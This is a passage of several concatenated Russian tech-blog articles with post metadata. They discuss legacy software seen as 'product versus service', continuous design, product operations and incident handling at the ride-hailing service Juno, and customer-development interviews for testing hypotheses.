любого разрабатываемого ПО сделать legacy, причем следуя этой формуле успеха достигает сам разработчик этой самой программы, без чьей либо помощи. Формула проста: чтобы получить legacy софт, вам необходимо относится к разработке сервисного ПО так, как будто вы делаете товар.\nИли другими словами: если вы видите, что участвуете в разработке сервиса (то есть вы надолго в этом проекте, вы будете еще несколько лет добавлять новые функции в проект, адаптировать его к новым реалиям), однако есть желание сделать из проекта истинное legacy (то есть программу, в которую невероятно сложно вносить изменения, которая неспособна работать на более новой ОС/железе и т.д.), то просто начните относиться к проекту как к товару. Просто рассматривайте каждый релиз, как последний. Чаще употребляйте слова \"ну всё, продали версию\". Как можно активнее делайте маленькие костыли и хаки, вместо переработки кода. И напоследок: побольше ручного труда (забудьте про TeamCity/Jenkins), и никогда не пишите документаций, спецификаций и разных комментариев в коде.\nДовольно интересно, что если буквально чуть-чуть изменить отношение к ПО, то оно само будет становится страшным legacy, причем сделанным своими руками.\nПособие: как же не делать из своих программ legacy\nКак ни странно, однако для того, чтобы не получить ужасное ПО на руках, необходимо всего лишь задавать себе вопрос раз в месяц/квартал: а продукт, который я делаю, является товаром или сервисом? И запомнить/записать этот ответ хотя бы на некоторое время. В дальнейшем любые вопросы о тестах, рефакторинге, документации и пр. будут отпадать сами собой.\nПримеры:\n\nЧто нам лучше сделать с тестами, которые постоянно падают при каждом обновлении зависимостей и при каждом релизе? Причем падают они не по делу.\n\nДля программы-товара: лучше просто удалить эти проблемные тесты. Всё равно от них сейчас уже больше проблем, чем пользы. А в дальнейшем они будут никому не нужны.\nДля программы-сервиса: есть смысл починить/исправить тесты, чтобы уменьшить их false-positive срабатывание. Каждая починка тестов — это наше время, однако наличие этих самых тестов уменьшит риски пропустить ошибку в будущем.\n\nСтоит ли обновиться на Spring Boot 2, или есть смысл оставаться на 1.5?\n\nДля программы-товара: строго нет. Мы скоро закончим проект и никогда не вернемся к этому заказчику. У нас не будет задач ни по поддержке этой программы, ни по добавлению новых функций, ни по обновлению на новую Java с исправлениями безопасности.\nДля программы-сервиса: строго да. Ведь эта версия будет неподдерживаемой уже через год. Более того, чтобы запускаться на бесплатной Java, нам необходимо будет обновиться на Java 11 уже очень скоро, однако ряд модулей из Spring Boot 1.* (как минимум — ASM) не поддерживает байткод от Java 9+.\n\nСтоит ли нам обновить техническую документацию по продукту?\n\nДля программы-товара: а нам за это заплачено? Если нет — лучше вообще удалить, так как в ней могут быть ошибки, которые потом придется исправлять \"по гарантии\". А если нет документации — то нет и ошибок.\nДля программы-сервиса: конечно да. Через пару лет эта документация нам очень пригодится, когда новым разработчикам придется объяснять, как и почему у нас всё так работает.\n\n\nТовар или сервис продает IT аутсорсер\nНесмотря на то, что аутсорсер технически является IT компанией (более того, основная часть послужного состава — это люди, относящиеся к IT), самые важные шаги в проекте:\n\nПодписан договор с заказчиком\nЗаказчик подписал \"приемо-сдаточный акт\" (или по-другому — готовый товар продан)\n\nТо есть все остальные действия сотрудников компании крутятся только вокруг этих пунктов. И именно эти две вещи прямо влияют на то, что же на самом разрабатывает аутсорсер — товар или сервис.\nНапример, для государственных заказов зачастую разрабатываются товары. И ни разу не сервисы (хотя и такое тоже бывает). А потому, в таких проектах нет никакого резона делать документацию, ускорять работу программы (то есть делать заказчика довольными). А значит получаем правило: если вы разрабатываете, тестируете или настраиваете ПО в фирме аутсорсере, который забудет про контракт после подписания акта, то нет никакого смысла даже задумываться о тестах, документации, выделении абстракций и пр.. Более того, если вы будете советовать менеджеру среднего звена \"сделать софт лучше\", то он абсолютно не поймет, зачем вы в принципе задумываетесь о таком. Ведь компания мало того, что не получит никакой прибыли от рефакторингов, она зачастую может понести вполне реальные убытки то того, что разработчик тратит время не пойми на что.\nБолее того, если компания-аутсорсер делает подобный софт на заказ, то у неё зачастую нет никакого стимула делать программы безопасными (ведь в будущем всегда можно просто наехать на блогера, как это делали в 90е, верно? а все убытки так или иначе понесет заказчик)\nТак почему же получается legacy?\nПрочитав статью, невольно рождается мысль: ведь все эти идеи до боли просты. Почему же тогда у нас получается legacy софт? Почему у одной компании/команды продукты легки в поддержке, а у других программы тормозят, а разработчики тратят кучу времени на поддержку?\nОдин (из многих) ответов — это отношение самих людей в командах к программам как к товару, или же как сервису. Причем здесь важно понимать, что в данном контексте, команда — это все люди, которые имели отношение к разработке софта, то есть и тестировщики, и разработчики, и аналитики, и менеджмент. Суммарная позиция всех людей и дает позицию команды. И она может быть как и \"мы продаем товар\", так и \"мы делаем сервис\".\nПримеры конфликта, когда команда разрабатывает сервис, однако относится к нему, как к товару:\n\nЕсли участники проекта не заинтересованы в долгой работе с этим проектом. Например, человек может планировать уйти из фирмы в ближайшее время. Или в компании высокая текучка (в том числе когда люди часто переходят из команды в команду), которая приводит к тому, что участники проекта могут не ассоциировать себя с этим проектом. Т.е. если ты знаешь, что через полгода будет работать с другими людьми и над другими задачами, то какой смысл вкладывать силы в текущую программу? Зачем писать документацию, зачем делать авто-тесты и пр.? Лучше просто сделать побыстрее, получить премию за ускоренную пятилетку и пойти работать в другое место.\nМетод кнута и пряника в команде/компании построен так, что намного выгоднее чаще отчитываться о создании новых продуктов и о замене старых. Такое может получиться, если все бонусы в компании выдаются за то, что \"был сделан продукт А\" или за то, что \"был переделан продукт Б\", а не за то, что \"продукт С постоянно развивается и помогает зарабатывать деньги\". В этом случае все разумные люди будут избегать долгих сроков (за это не дадут пряник). Ключевая разница — в презентации будут превуалировать законченные формы глаголов, по отношению к проектам (т.е. программа сделана, проект завершен), вместо длительных (сервис позволяет зарабатывать, команда обеспечивает инфраструктуру).\nИ не забываем про стандартный саботаж (или job security) — зачем делать документацию к продукту, который ты хорошо знаешь? Ведь иначе менеджер легко найдет тебе замену. Зачем упрощать жизнь при поддержке ПО? Ведь если поддержка ПО очень простая, то тебя можно заменить на кого-нибудь другого. Этот пункт очень пересекается с первым, который описывал компанию с большой текучкой. Однако стоит понимать, что условная \"job security\" мало перекликается с идеей товаров или сервисов, просто это зачастую является хорошим объяснением многих процессов, так что нельзя не упомянуть.\n\nПримеры обратного конфликта, когда команда на самом деле создает товар, однако относится к нему как к сервису:\n\nНепонимание бизнеса. Даже очень честный аутсорсер редко признается, что его прибыль — это разница между тем, сколько платит заказчик за проект, и тем, сколько он может стоить в минимальном исполнении, при условии, что заказчик готов принять его. То есть основной заработок — это возможность сэкономить там, где в долгосрочном периоде экономить было бы неразумно. Отсюда и возникает конфликт — если менеджер среднего звена говорит заказчику о том, что \"мы делаем лучший в мире софт\", то разработчик может начать принимать всё это за чистую монету.\nВсегда так делали. Если команде enterprise java разработчиков (делающих сервисы, которые потом улучшаются и дополняются в течении десятилетия) дать задание \"сделать временный сервис по копированию файлов из пункта А в пункт Б\", то велик шанс того, что этот простейший сервис будет переусложненным. Да, он будет копировать файлы, однако само копирование будет спрятано за 10ю слоями абстракции (а через пару месяцев — за 11ю).\n\nВлияние товаров и сервисов на языки и технологии\nНа хабре зачастую есть немало споров по части того, какой язык программирования лучше. Или же какая технология лучше. Как ни странно, немало из них возникает из-за того, что у сторон разное понимание того, чем является программа — товаром или сервисом.\nЕсли у вас одноразовая задача (например, перекопировать файлы из пункта А в пункт Б с некоторыми условиями и минимальными преобразованиями), то довольно глупо будет выбирать технологии, рассчитанные на долгую поддержку, дающие длинную обратную совместимость. Для таких задач Go/Python будет идеальным решением.\nИ наоборот — если в вашу задачу входит длительное оказание сервиса (с частыми обновлениями безопасности и т.д.), то на первое место выходят такие плюсы платформы, как обратная совместимость, легкость обновления, простота патчинга и т.д. Вам уже становится абсолютно неважно, легко или сложно написать Hello World на выбранном языке, так как такие программы будут создаваться раз в несколько лет.\nИ как это использовать?\nВ заключении — как использовать то, что программа может являться как товаром, так и сервисом.\n\nРаз в месяц просто вспоминайте, что вы делаете: товар или сервис.\nНе пытайтесь развивать товар. Его продают один раз и забывают. Этот подход невероятно понятен бизнесу. Работайте по системе \"сделал — забыл\".\nНе относитесь к сервисным проектам как к товару. Вы будете долго общаться с пользователями, им в этом случае важнее долговременное сотрудничество, а не сиюминутная выгода.", {"day": "19", "month": "августа", "time": "20:23"}, {"rate": 14, "views": 6400}], ["На практике случается, что вы разработали продукт, а после запуска клиенты используют его не так, как предполагалось. Затем выясняется, что задачи пользователя уже другие, и они идут вразрез с запланированным развитием продукта и вашим видением проекта. Почему?\n\nНа самом деле, вы работаете с задачей пользователя, которая не понята до конца и которая меняется под влиянием продукта. Это наталкивает на мысль, что продукт нужно доработать, причем в паре с клиентом. Так вы сразу обезопасите себя от создания ненужных решений, основанных лишь на гипотезах.\n\r\nЯ думаю, что лучше всего выстраивать коммуникацию с пользователем по принципу continuous design, о котором и пойдет речь в статье. \n\n\n\nДорогой и сомнительный IT хаос\nБольшая часть продуктов и функций, поставляемых IT, не находят применения на практике. Ресурсы, приложения, софт остаются невостребованными. Не все компании задумываются о том, нужны ли их продукты на самом деле. \n\nЯрким доказательством служит рынок мобильной разработки, который имеет измеримые показатели. Хотя здесь сконцентрированы передовые практики, статистика оставляет желать лучшего: в 2017 году аналитическая компания Localytics опубликовала исследование Sql, из которого следует, что 24% приложений пользователи открывают лишь один раз. \n\n\nЭто с учетом того, что процент пользователей, которые открывали приложение менее 10 раз, не превышает 63%. Если брать во внимание «стабильность» статистики, то становится ясно, что выводов из нее не делают. Люди умеют разрабатывать, но они упускают аспект того, как продукт войдет в жизнь человека, то есть не пользуются человекоцентричной моделью. Последняя предполагает долгосрочное взаимодействие с клиентом; обычно в течение нескольких лет.\n\nЭто приводит нас к выводу: в к клиентоцентричном подходе нужно обратиться к существующим практикам разработки вроде DevOps, agile или scrum, которые обычно применяются по отдельности. Но если объединить их, мы получим нечто большее под названием continuous design. Он состоит из классических принципов DevOps и дизайн-мышления. Его мы и предлагаем рассмотреть и взять на вооружение, но чтобы внедрить принцип в разработку нужно пересмотреть отношения между двумя составляющими: дизайном и операциями.\n\nВводные со стороны операций и дизайна \nОперации — то, что происходит сейчас. Это могут быть системное администрирование, пользовательская поддержка, бизнес-процессы. Операции строятся по разным моделям, например, с помощью упомянутого DevOps. Она предусматривает постоянный процесс обратной связи, доработок и поставку решений. Создается «петля» из фидбэка, планирования, поиска решений и их презентации. И для каждого из этапов есть инструменты, которые помогают в работе, автоматизируют процессы и обеспечивают постоянный обмен информацией и решениями.\n\n\nДизайн — все, что участвует в определении действий, методах построения и способах упаковать продукт для потребителя. Обычно мы подходим к дизайну, как к решению проблемы. Если мы понимаем суть проблемы, то можем предложить верное решение. \n\nЭто традиционный подход.\n4 обстоятельства, которые не учитывает традиционный подход\n\nНо при объединении дизайна и операций выявляются 4 фактора, на которые ранее не обращали внимание команды, работающие по отдельности. И для этих аспектов continuous design становится решением:\n\n#1. Проблему нельзя понять полностью\nС помощью аналитики и исследований мы строим гипотезы о том, как люди будут пользоваться продуктом, но они дают неполное представление о проблеме, так как мы не можем охватить все ее аспекты. Только когда продукт попадает в руки потребителя, мы видим, насколько полезным для потребителя он оказался, какие задачи помог решить или что поменял. \n\nПростой пример: на джинсах есть маленький кармашек для часов. Его изобрела компания Levi Strauss в 1873 году. С тех пор кармашек никто не использовал по назначению. Компания даже выпустила целый ролик, посвященный этому.\n\n#2. Продукт меняет потребителя\nАктивный опыт взаимодействия с продуктом меняет пользователя. А это трансформирует проблему, которую продукт решает, что создает новые затруднения для вас и клиента.\n\nВспомните, как мы заказывали такси 5-6 лет назад: оператор на другом конце провода принимал заказ и говорил, что машину подадут через 20-30 минут. И мы были готовы ждать. С запуском сервисов вроде Uber, Gett и Яндекс.Такси наше восприятие поменялось: в 2018 году оптимальное время подачи авто для нас 2-3 минуты. Если мы ждем дольше, это начинает раздражать. И дело не в диджитализации или уберизации, а в изменении нашей модели потребления. \n\n#3. Ценность — нечто, создаваемое совместно\nЦенность продукта невозможно представить на момент его создания. После запуска сервис начинает жить своей жизнью и обретать новую ценность, которая формируется при использовании. Часть функций будет востребованной, а другая — нет. Так и созревает ценность, созданная вами и потребителем. Поэтому часто полезность остается неочевидной до тех пор, пока товаром или услугой не воспользуются.\n\nВспомним AppStore, который появился вопреки представлениям о ценности Apple. В 2007 году Стив Джобс презентовал iPhone со словами: «Вам не нужно писать программы. Это ни к чему: у вас есть html5». Пользователей это не остановило: они взламывали устройства и писали свой софт, распространяемый через программное приложение Cydia. Его запустили в марте 2008 года, а уже 10 июня того же года ребята из Купертино переняли успешный опыт и запустили AppStore, изменив ситуацию в свою пользу и став игроком №1 на мобильном рынке.\n\nЭтот тезис приводит нас к выводу, что разработчик и потребитель являются частью проблемы и решения. \n\n#4. Сложность исключает контроль\nМы постоянно создаем сложные системы, которые невозможно полностью проконтролировать. И это ведет к неизбежным отказам и ошибкам в них. Одна из главных проблем в работе с такими системами — попытки контроля на слишком многих уровнях, когда вы тщательно продумываете, что произойдет или может произойти. \n\nЯ уверен, что все мы когда-то звонили в клиентскую поддержку, где нас уйму раз перенаправляли на разных операторов. И мы снова и снова описывали проблему и ждали ответа под фоновую музыку компании. Это те случаи, когда сервис — операторы — продуман слишком тщательно. У сотрудников есть алгоритмы общения с клиентам, которые постоянно переписываются и детализируются. Вместо того, что служить на благо пользовательским интересам, они лишь усложняют и запутывают систему. Один оператор из-за политики компании не может решить вашу проблему, даже если она простая. Он просто обязан перенаправить вас на кого-то еще. \n\nСофтверизация в цифровой среде\n\nПосмотрите на эволюцию iPod\n\nЭти неучтенные факторы влияют не только на цифровой, но и на физический мир. Становится труднее получить опыт, который не включает промежуточную программную составляющую. Среда, в которой мы живем, софтверизируется, и это меняет восприятие вещей и то, как мы ими пользуемся.\n\nНапример, Tesla выпустили обновление ПО, которое увеличивает время автономной работы автомобиля. При этом совершенствуются его физические характеристики: теперь можно съездить не только до супермаркета или работы, но и до соседнего города. Изменилось не количество поездок и не длина пути, а качества автомобиля, а с ними и понимание задач и целей его использования. Теперь не нужно тратить деньги на такси или ставить другие ограничения, ведь аккумулятор работает в 2 раза дольше. Одна машина закрывает все задачи ее владельца. \n\nБренд уходит от обещания к диалогу\nЕсли с операциями и дизайном все стало понятнее, то остается более крупное и абстрактное понятие бренда. Он тоже работает в связке continuous design. \n\nРаньше мы воспринимали бренд как обещание. Например, стабильности или неизменности. Но сейчас его основа смещается к диалогу, потому что мы живем в парадигме меняющихся ценностей. И диалог с пользователем не должен быть односторонним, он завязан на постоянном общении.IT именно та среда, где это делается быстрее всего. Ведь у нас есть инструменты для обеспечения постоянной обратной связи на разных уровнях: от внешних аналитических сервисов до методов DevOps.\n\nIТ становится средой непрерывного диалога\nМы начинаем безостановочно менять продукт благодаря обратной связи клиента, за которым наблюдаем и чьи действия анализируем. Так петля DevOps замыкается в бесконечность, когда в этом процессе участвуют операции, разработка, дизайн и маркетинг: мы выбираем одно решение из многих, внедряем его и смотрим, как оно поведет себя на практике. Именно в таком виде и работает continuous design. \n\nПарадигма непрерывного проектирования\n\nИ для того, чтобы дизайн становился увлекательным диалогом, есть 4 рекомендации:\n\n#1. Проектируйте взаимодействие клиентов и сотрудников в точках их соприкосновения\nПрежде чем выпускать продукт, спроектируйте пользовательский опыт. И изучать его надо не только в идеальных условиях, когда товар или услугу используют правильно, но и там, где клиент соприкасается с бизнес-процессами: бэкофисом или IT-архитектурой. Проектирование опыта с опорой на внешнюю среду и на образ жизни пользователя помогает выявить, как продукт и сотрудники, с которыми он взаимодействует, впишутся в жизнь человека. Это также прояснит, какие будут точки соприкосновения с подразделениями компании и при каких условиях. Для этого можно использовать CJM и jobs-to-be-done клиентов и коллег. \n\n#2. Минимизируйте задержку, максимизируйте обратную связь\nГибкие методологии разработки вроде agile и практики DevOps дают не только скорость и поставку апдейтов или бета-версий. Используя их мы можем быстрее получить обратную связь, проверить гипотезы и скорректировать действия, чтобы улучшать продукт и дальше. Мы учимся на каждом спринте работы или обновлении продукта и выжимаем из нее знания на протяжении всего жизненного цикла сервиса.\n\n#3. Проектируйте для ошибок. Делайте, чтобы учиться\nПревратите провалы в информацию, служащую вашим и пользовательским интересам. Ошибки неизбежны на все этапах, будь то проектирование функций или разработка маркетинговой кампании. Но к ним нужно быть готовым и строить continuous design, чтобы уметь вовремя заметить ошибку и сделать выводы. Здесь важно использовать практики Lean UX, такие как UX-тесты, АВ-тесты, гипотезы и так далее. \n\nВ конечном итоге формируется культура работы с ошибками и инструменты, которые она создает: как Chaos Monkey или Blameless post mortems.\n\n#4. Понятия «сделано» не существует\nМы находимся в условиях, когда проблему нельзя понять полностью, а решение при этом изменяет ее. Поэтому команда не может просто следовать гипотезам о ценности продукта и дальше проектировать IT-архитектуру и сервис. Вместо этого нужно смотреть, как работают продукты и услуги, когда окажутся за пределами контроля. Обратная связь в петле DevOps бессмысленна, пока операции и окружающий мир не влияют на процесс усовершенствования продукта. И в этом случае исключается понятие «сделано». Вы постоянно меняете продукт. Значит, процесс продолжается и дальше в системе DevOps и дизайн-мышления.\n\nРабота в парадигме continuous design учит быстро реагировать на ошибки, проще относиться к ним и не делать бесполезной работы. Ее преимущество в том, что шаг за шагом закрывается все больше задач клиента, что приносит дополнительную прибыль и благотворно сказывается на бизнесе. \n\n\np.s. На написание этого материала меня вдохновило выступление Джеффа Сассна.", {"day": "23", "month": "июля", "time": "11:45"}, {"rate": 10, "views": 4300}], ["О плюсах работы в продуктовой компании рассказано уже много, и здесь сложно быть оригинальным. А вот о том, как поддерживать «здоровье» продукта и чем можно заниматься в продуктовой компании, кроме разработки функциональности, знают далеко не все. Мы расскажем, как мы в Juno оперируем продуктом, и как в этом задействованы операционный отдел и технические специалисты.\n\r\nМы не заявляем, что наш путь самый правильный, Мы постоянно пробуем, ошибаемся и стараемся учиться на своих ошибках. Надеемся, что наш опыт будет вам полезен.\n\nО нас: Компания Juno — райдхейлинг сервис, работающий на рынке США и являющийся частью группы компаний Gett.\n\r\nВ Juno пишут код на языках Go, Swift, Kotlin, Python, React.js в составе команд мобильных приложений, Backend, Frontend, Data Science, Technical Operation Support, создающих сервис, который стал частью повседневной жизни десятков тысяч водителей и сотен тысяч жителей Нью Йорка.\n\nИз чего состоит управление продуктом\r\nДавайте разберемся в процессе оперирования в Juno и попробуем разложить его на составные части. \r\nМы для себя выделили три ключевых компонента:\n\n\nОперационный офис \n\nМетрики и мониторинг\n\nРасследование инцидентов \n\n\nЦель оперирования продуктом заключается в своевременном реагировании на возникающие проблемы и изменения независимо от их природы. \r\nДля этого нужно:\n\n\nОпределить показатели «здоровья» системы \n\nПонимать, как изменения внутри системы влияют на показатели\n\nПонимать, как изменения на рынке влияют на показатели\n\nПонимать, когда изменение перерастает в проблему \n\n\r\nПри таком подходе бизнес-решения основываются на данных. Наша команда оперирования работает в Нью-Йорке, так как сервис Juno пока доступен только жителям этого мегаполиса.\r\nЕжедневный список дел команды выглядит так: \n\n\nОтслеживать и оперативно реагировать на изменения регуляторов. К распространенным изменениям относятся появление новой платной дороги и перенос зоны ожидания для водителей в аэропорту. Как только мы получаем информацию о подобных событиях, сотрудник выезжает на место, чтобы правильно обновить карту и проанализировать список возможных проблем. Когда команда разработки обновляет карту на серверах, сотрудник тестирует изменения в “полевых условиях” и удостоверяется в корректной работе.\n\nПроводить «полевые» исследования. Когда мы запускали сервис в Нью-Йорке, план был сначала набрать определенное количество водителей для стабильной работы сервиса в любом районе города. По этой причине пару месяцев водители, которые присоединились к нам первыми, ездили без пассажиров и только иногда получали поездки от бета-тестеров. Для сбора необходимой информации этих поездок было недостаточно. Тогда мы приняли решение отправить команду оперирования в “поля”, чтобы оценить качество сервиса и узнать жалобы водителей на работу приложения. Данный подход оказался полезным и мы постоянно его используем при выпуске существенных изменений или для проверки гипотез.\n\nВести «Календарь Событий» — список мероприятий, праздников и погодных явлений, способных повлиять на количество и качество поездок. Это помогает понять и предвидеть изменения ключевых показателей (например, количество поездок или количество водителей онлайн), которые для команды разработки из Минска не очевидны. Некоторые события можно загуглить (погодные условия, финал SuperBowl, марафон, велогонка и т.д.), но есть и такие, с которыми сложнее. К примеру, в первый год работы для нас стало сюрпризом, что Рамадан сильно влияет на количество водителей, готовых принять заказ. Дело в том, что в США много мусульман работают водителями, и в праздник на работу они не выходят. Сложно учесть такой факт, находясь в Минске.\n\nОтслеживать изменение бизнес метрик. На третий месяц после запуска Juno и бурного роста количества поездок мы обнаружили, что в онлайн вышло недостаточно водителей, что сказалось на времени подачи автомобиля и на желании пассажиров ездить с нами. Выяснилось, что конкурент запустил акцию, гарантирующую водителям повышенную оплату на поездки в утренние и вечерние часы пик. Информация была быстро передана в Минск, и в сжатые сроки у нас тоже появилась возможность предлагать такие условия. Этот шаг помог нам вернуть водителей и продолжить расти.\n\n\nМетрики и мониторинг\r\nВ Juno у всех команд есть метрики, которые мы условились разделять на:\n\n\nБизнес-метрики.\n\nТехнические метрики.\n\n\nБизнес-метрики — ряд показателей, которые позволяют оценить “здоровье” продукта. Условно разделим их на две части: \n\n\nОнлайн. К очевидным отнесем количество водителей и пассажиров онлайн, количество поездок по статусам. К менее очевидным — количество новых пользователей, конверсия перехода от экрана с предварительной ценой поездки до заказа поездки, среднее время ожидания автомобиля в конкретном районе, скорость движения очереди в аэропорту и т.д.\n\nОффлайн. Далеко не всю информацию можно быстро получить и обработать в реальном времени, да и не всегда это нужно. Когда мы планируем акции для водителей или новые функции, то нам интересны долгосрочные тренды или реакция пользователей на A/B эксперимент, будь то новый дизайн, новая функция или дополнительная скидка.\n\n\r\nДля создания аналитических отчетов на базе собранных метрик используем Tableau. За такие отчеты у нас отвечает команда Business Intelligence (BI). Они работают в Тель-Авивском офисе рядом с продуктовой командой. Обе команды тесно сотрудничают с коллегами в Нью Йорке, что позволяет на основе BI аналитики оценить успех предпринятых действий, сформулировать гипотезы для проверки в “полях” и откорректировать план развития продукта. \n\r\nС другой стороны, есть целый ряд технических метрик, которые так или иначе влияют на систему в целом. \n\nТехнические метрики — ряд показателей, указывающих на безошибочность работы отдельных компонентов, на базе которых делается вывод о работе системы в целом. Они показывают, как много времени занимают вызовы между сервисами, как много памяти они потребляют и нет ли критических ошибок при передаче сообщений между ними. Таких метрик в Juno много. Они в некоторой мере избыточны, но в критических ситуациях это помогает быстро найти причину проблемы. Отслеживать и использовать технические метрики нам помогают:\n\n\nДашборд — отображает значимые показатели жизнедеятельности системы. Каждая команда разработки составляет свой набор метрик, которые помогают им понять, как повлияло то или иное изменение на ввереные им микросервисы. Так, например, одна команда следит за метриками, связанными с выплатами денег водителям и платежами пассажиров, а другая смотрит за метрикой, отвечающей за время поиска водителя или количеством полученных координат.\n\n\n\nЛоги. Мы логируем события с мобильных устройств и микросервисов бэкенда. В 2017 они занимали 400-500 гигабайт в неделю, к 2018 эта цифра удвоилась. Нас интересуют следующие события: обращения микросервисов во внешние источники информации, в другие микросервисы, принятые и отправленные запросы на клиенты, всякого рода ошибки (бизнес и технические). Стоит отметить, что информация анонимизирована: персональные данные, такие как пароли и банковская информация, не логируются. \n\n\r\nДля наблюдения за показателями мы используем Grafana и Prometheus. При разработке нового сервиса или добавлении новой функции разработчики добавляют нужные метрики в сервис, а дальше каждая команда настраивает себе оповещения.\n\r\nБлагодаря настроенным оповещениям команда технической поддержки делает первичный анализ и эскалирует проблему в разработку или в бизнесовые команды для  дальнейшего решения.\r\nВ случае, если проблема носит технический характер и угрожает нормальному оперированию сервиса, команда технической поддержки создает продакшн инцидент (production issue). Благодаря автоматизированному процессу, сразу оповещаются заинтересованные стороны, в том числе и команда поддержки пользователей (Customer service aka Helpdesk aka L1 support), которая подготавливается к возможному наплыву звонков.\n\nРасследование инцидентов\r\nСо временем мы пришли к тому, что после каждого серьезного инцидента проходят своеобразные «разборы полетов». Мы вносим изменения в процессы, которые помогают нам избежать или лучше справляться с подобными событиями в будущем.\n\r\nУпомянутые выше элементы: метрики, дашборды, алертинг и логи помогают понять, что случилось. Команды садятся вместе, анализируют изменения технических и бизнес-показателей, учитывают ошибки и выносят для себя уроки.\n\r\nРазбираться приходится как с продакшн инцидентами, так и с любой другой ситуацией, когда невозможно быстро ответить «что произошло». И здесь помогает команда технической поддержки (TechSupport aka L2 support).\n\r\nКакие вопросы решаются в техподдержке? Есть мнение, что это скучная работа, как в сериале IT Crowd, где три ботаника в подвале только и делают,  что говорят: «попробуйте выключить и включить компьютер». В действительности вопросы возникают сложные и неоднозначные.\n\r\nПервый уровень поддержки (customer service) организован по принципу «следуй за солнцем» (follow the sun). При таком подходе круглосуточная поддержка пользователей возможна без ночных смен. В европейское время работает офис в Тель-Авиве, а в американские часы — в Портленде. Задача этой команды выслушать и понять «боль» водителя или пассажира, успокоить, по возможности помочь. Ребята, которые там работают, отвечают за вопросы, касающиеся работы сервиса. При этом команда не «техническая», и как только наступает момент, когда требуется погружение глубже в технические нюансы, запрос перенаправляется в команду технической поддержки. Эта команда работает в Минске и входит в состав центра разработки. Ребята  решают исключительно технические вопросы и не общается с водителями и пассажирами напрямую. Задача команды: расследование происшествий и автоматизация процессов.\n\r\nВ случае продакшн инцидента задача для команды техподдержки выглядит так: нашелся баг или произошел сбой во время деплоймента, мы заметили проблему, устранили, но нужно еще разобраться, как это повлияло на систему и что нужно восстановить с точки зрения управления продуктом:\n\n\nПовреждены ли данные, не нарушена ли их целостность?\n\nКак это происшествие повлияло на пользователей?\n\nВсе ли пользователи пострадали?\n\nЧто можно исправить?\n\n\r\nВопросы простые, но чтобы ответить на них, нужно очень хорошо понимать, как работает система и как менялось ее поведение во время происшествия. При ответе на вопрос стоит учитывать постоянный процесс деплоймента, как вероятность того, что в каждую минуту что-то может измениться.\n\r\nКак пример, когда потребовалась помощь техподдержки при корректной работе продукта, рассмотрим случай «я не совершал поездку». Водитель забрал другого пассажира и совершил поездку, за которую наш пассажир платить не хочет. В таком случае нужно различать, правомерный запрос и попытку мошенничества, когда пользователь пытается не платить за оказанные услуги.\n\r\nЕсли запрос приходит неоднократно, то он автоматизируется силами команды техподдержки и предоставляется команде поддержки пользователей в виде веб приложения. Такой подход позволяет сократить время на обработку обращения пользователя и не «раздувать» команду техподдержки. Тем не менее вакансия инженера техподдержки у нас открыта постоянно, так как ребята растут и переходят в другие команды разработки.\n\nВсе дороги ведут в Рим\r\nПодробное описание работы команды техподдержки в рамках данной статьи не случайно. Так сложилось, что она стала местом, куда стекается информация из всех источников. Единая точка контакта уменьшает количество интерпретаторов, а следовательно сокращается и количество искажений.\n\r\nЭто не значит, что команда техподдержки — главное звено в управлении продукта оперирования, ведь продуктовая компания — живой организм: все органы важны и нужны. Невозможно выбрать, что важнее для человека — мозг или сердце, легкие или кровеносная система. Только гармоничное развитие и взаимодействие всех органов гарантирует здоровое функционирование организма или IT компании. \n\r\nЗдоровья вам и вашим продуктам!", {"day": "4", "month": "июля", "time": "10:22"}, {"rate": 11, "views": 2400}], ["Epic Growth Story — флешмоб от Gett и Epic Growth Conference, где специалисты по продуктам, маркетингу и дизайну делятся эпичными историями роста. В формате блиц-интервью Product Advisor Иван Замесин поделился в рамках проекта Epic Growth Story, как быстро проверять гипотезы и собирать фидбек от пользователей с помощью Customer Development.\n\n\r\nСмотрите интервью и читайте заметки под катом.\n\nGrowth hack в продукте?\n\r\nКогда я отвечал за интерфейс Yandex.картинок, в 2013 году у нас был еще постраничный интерфейс. Интерфейс выглядел грустно, плохо и тяжело. Мы выкатили UX-интерфейс и старались делать много разных экспериментов. Один из экспериментов – это поиск картинок. Мне пришла в голову идея поменять цвет рамки картинки с белого на черный и цвет текста, соответственно, тоже. Мы за 5 минут внедрили это изменение и получили плюс 10% к нашей метрике – количество просмотренных картинок за сессию. Для такой инертной штуки, как поиск с 5 млн DAU – это кратный рост.\n\nGrowth story, которая вдохновляет?\n\r\nМеня, скорее, вдохновляют такие процессы, когда все ребята забуриваются на одну метрику, очень быстро запускают процесс, оперативно вырезают гипотезы до минимально возможной и проверяют кастдевом, прототипами, недорогими экспериментами и самыми дешевыми вариантами решений. Проверяют сначала одну гипотезу в месяц, потом полторы, две, три, четыре. Вдохновляет, когда команда выходит на такой темп. Именно такой процесс я приношу во все бизнесы, которые консультирую.\n\nКак проверить гипотезу?\n\r\nОчень часто команды продактов думают фичами. Гипотеза равно фича, которая решает потребность пользователя. На этапе Job Story проверки гипотезы – половина этих гипотез умирает. Job Story дает понимание, нужно ли внедрять эту фичу или нет. И главное, что нет необходимости инвестировать в разработку и тратить много денег на проверку таких экспериментов.\n\r\nКогда Job Story подтвердилась, следующее по скорости и простоте – попросить пользователя сделать социально дорогое действие, например: «Напишите пост в Facebook про то, что скоро такая штука будет», «Отправь своим друзьям в Instagram Direct» и так далее. Пользователь своими действиями должен подтвердить, что это действительно важно. Прошли через подтверждение, нарисовали макет, показали трем людям, снова попросили подтверждение. Окей, это подтвердилось, сделали наколеночное решение, получили деньги.\n\r\nНа каких-то этапах необходимо больше детализации, какие-то этапы просто пропускаешь. Есть сложные вещи, которые пользователю просто так не рассказать, например, реферальная система. Реферальную систему тяжело проверить кастдевом. Тут, скорее, нужно придумывать самый простой MVP, запускать на скриптах, лендить пользователей, которые пользуются интерфейсом, и смотреть на результат.\n\nКлассный Customer Development?\n\r\nСамый классный custdev – это тот, который делаешь, плохой custdev – который не делаешь. CustDev – это как спорт. Все знают, что надо заниматься спортом, прокачивать размер сердца, чтобы утончались стенки, и вы не умерли от инфаркта миокарда, но никто не занимается. Тоже самое с CustDev-ом. Все знают, что надо разговаривать с пользователями, но постоянно находятся отговорки этого не делать.\n\r\nДелайте 4 интервью с пользователями в неделю, и вы красавчики.\n\nКак собирать фидбек от пользователей?\n\r\nСамый крутой фидбек – когда пользователь сам загружает его тоннами и вам для этого ничего не надо делать. Во всех командах, во всех бизнесах, которые я сейчас консультирую, я настраиваю процессы, когда фидбек прилетает пушем. Чатики с пользователями, например. Это действительно работает, потому что ты получаешь обратную связь мгновенно по любому интересующему вопросу. Если нужно проверить 